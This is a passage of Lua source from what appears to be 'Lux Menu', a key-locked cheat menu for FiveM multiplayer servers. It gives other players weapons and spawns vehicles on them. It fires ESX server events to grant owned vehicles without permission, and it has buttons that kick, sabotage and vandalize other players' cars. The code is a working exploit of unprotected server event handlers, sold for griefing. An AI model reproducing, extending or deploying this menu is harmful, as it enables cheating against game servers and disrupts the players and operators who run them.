			if WarMenu.IsMenuOpened("OnlineWepCategory") then
				WarMenu.SetSubTitle("OnlineWepCategory", "Give Weapon - " .. GetPlayerName(SelectedPlayer) .. "")

				WarMenu.MenuButton("Melee Weapons", "OnlineMeleeWeapons")
				WarMenu.MenuButton("Sidearms", "OnlineSidearmWeapons")
				WarMenu.MenuButton("Auto Rifles", "OnlineAutorifleWeapons")
				WarMenu.MenuButton("Shotguns", "OnlineShotgunWeapons")

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("OnlineMeleeWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_me" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(hash), 0, false, false)
						end
					end
				end

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("OnlineSidearmWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_hg" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(hash), 32, false, false)
						end
					end
				end

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("OnlineAutorifleWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_ar" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(hash), 60, false, false)
						end
					end
				end

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("OnlineShotgunWeapons") then
				for hash, v in pairs(t_Weapons) do
					if v[4] == "w_sg" then
						if WarMenu.Button(v[1], "isWeapon") then
							GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(hash), 18, false, false)
						end
					end
				end

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("OnlineVehicleMenuPlayer") then
				WarMenu.SetSubTitle("OnlineVehicleMenuPlayer", "Vehicle Options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if WarMenu.Button("Spawn Vehicle") then
					local ModelName = KeyboardInput("Enter Vehicle Model Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(GetPlayerPed(SelectedPlayer)), GetEntityHeading(GetPlayerPed(SelectedPlayer)), true, true)

						SetPedIntoVehicle(GetPlayerPed(SelectedPlayer), veh, -1)
						drawNotification({text = NotifyFormat("Successfully spawned ~b~%s ~s~on ~t~%s", string.lower(GetDisplayNameFromVehicleModel(ModelName)), GetPlayerName(SelectedPlayer)), type = "info"})
					else
						drawNotification("~r~Model is not valid!")
					end
				elseif WarMenu.Button("Spawn Owned Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					local newPlate =  KeyboardInput("Enter Vehicle License Plate", "", 8)

					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
						SetVehicleNumberPlateText(veh, newPlate)
						local vehicleProps = ESX.Game.GetVehicleProperties(veh)
						TriggerServerEvent('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
						TriggerServerEvent('esx_givecarkeys:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
						TriggerServerEvent('garage:addKeys', newPlate)
						SetPedIntoVehicle(GetPlayerPed(SelectedPlayer), veh, -1)
					else
						drawNotification("~r~Model is not valid!")
					end

				elseif WarMenu.Button("Kick From Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))

				elseif WarMenu.Button("Destroy Engine") then

					local playerPed = GetPlayerPed(SelectedPlayer)

					NetworkRequestControlOfEntity(GetVehiclePedIsIn(playerPed))

					SetVehicleUndriveable(GetVehiclePedIsIn(playerPed),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(playerPed), 100)

				elseif WarMenu.Button("Explode on Impact") then

					local ped = GetPlayerPed(SelectedPlayer)
					local veh = GetVehiclePedIsIn(ped, 0)

					RequestControlOnce(veh)

					SetVehicleOutOfControl(veh, false, true)

				elseif WarMenu.Button("Repair Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 0)

				elseif WarMenu.Button("Vandalize Car") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
					StartVehicleAlarm(playerVeh)
					DetachVehicleWindscreen(playerVeh)
					SmashVehicleWindow(playerVeh, 0)
					SmashVehicleWindow(playerVeh, 1)
					SmashVehicleWindow(playerVeh, 2)
					SmashVehicleWindow(playerVeh, 3)
					SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
					SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
					SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
					SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
					SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
					SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
					SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
					SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
					SetVehicleDoorBroken(playerVeh, 0, true)
					SetVehicleDoorBroken(playerVeh, 1, true)
					SetVehicleDoorBroken(playerVeh, 2, true)
					SetVehicleDoorBroken(playerVeh, 3, true)
					SetVehicleDoorBroken(playerVeh, 4, true)
					SetVehicleDoorBroken(playerVeh, 5, true)
					SetVehicleDoorBroken(playerVeh, 6, true)
					SetVehicleDoorBroken(playerVeh, 7, true)
					SetVehicleLights(playerVeh, 1)
					Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
					SetVehicleNumberPlateTextIndex(playerVeh, 5)
					SetVehicleNumberPlateText(playerVeh, "Lux Menu")
					SetVehicleDirtLevel(playerVeh, 10.0)
					SetVehicleModColor_1(playerVeh, 1)
					SetVehicleModColor_2(playerVeh, 1)
					SetVehicleCustomPrimaryColour(playerVeh, 231, 76, 60) -- r = 231, g = 76, b = 60
					SetVehicleCustomSecondaryColour(playerVeh, 231, 76, 60)
					SetVehicleBurnout(playerVeh, true)
					drawNotification("~g~Vehicle Fucked Up!")
				end

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if IsDisabledControlJustPressed(0, 121) then
				GateKeep()
			end

			Wait(0)
		end
end)


function GateKeep()
	local name = GetPlayerName(PlayerId())
	_buyer = "leuit"
	if _gatekeeper then
		if name == _buyer and GetCurrentLanguage() == 0 then
			WarMenu.OpenMenu("LuxMainMenu")
		else
			_auth = false
			drawNotification("~r~ERROR: ~w~You don't appear to own ~h~LUX MENU")
		end
	else
		_auth = true
		local input = KeyboardInput("Enter the keycode", "", 10)
		if input == _secretKey then
			_gatekeeper = true
			SendNotification({text = "~g~~h~SUCCESS : ~h~~s~Enjoy.", type = 'auth_success', timeout = 6000})
			SendNotification({text = "~g~~h~SUCCESS : ~h~~s~Enjoy.", type = 'auth_success', timeout = 6000})
		else
			_auth = false
			_notifTitle = "~r~AUTHENTICATION FAILURE"
			_notifMsg = "Your key is invalid!"
			_notifMsg2 = ""
			_errorCode = 1
			SendNotification({text = "~r~~h~ERROR : ~h~~s~Invalid keycode.", type = 'bottomLeft', timeout = 6000})
			PlaySoundFrontend(-1, "Hack_Failed", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS", true)
		end
	end
end
